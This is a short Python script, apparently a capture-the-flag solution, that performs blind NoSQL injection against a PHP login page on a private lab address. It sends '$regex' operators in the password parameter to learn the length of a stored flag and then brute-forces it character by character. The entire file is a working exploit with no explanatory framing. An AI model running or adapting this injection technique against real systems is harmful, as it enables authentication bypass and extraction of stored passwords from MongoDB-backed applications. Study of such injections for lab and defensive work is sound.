import requests

url = 'http://192.168.233.131:5001/NoSql_3.php?'
list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '{', '}', '_']


def burst_length():
    leng = 0
    for i in range(1, 100):
        payload = 'username=flag&password[$regex]=.{'+str(i)+'}'
        data = url+payload
        html = requests.get(data).text
        if 'success' in html:
            leng += 1
        if 'Not Found' in html:
            return leng-1


def burst_password(leng, result):
    for i in range(0, len(list)):
        payload = 'username=flag&password[$regex]='+result+list[i]+'.{' + str(leng) + '}'
        print(payload)
        data = url + payload
        html = requests.get(data).text
        if 'Not Found' not in html:
            return list[i]


if __name__ == '__main__':

    print('-------------------')
    sum = burst_length()
    print("flag长度为", sum)
    re = ''
    for i in range(1, sum+1):
        re += str(burst_password(sum-i, re))
    print("flag为", re)
    print('-------------------')
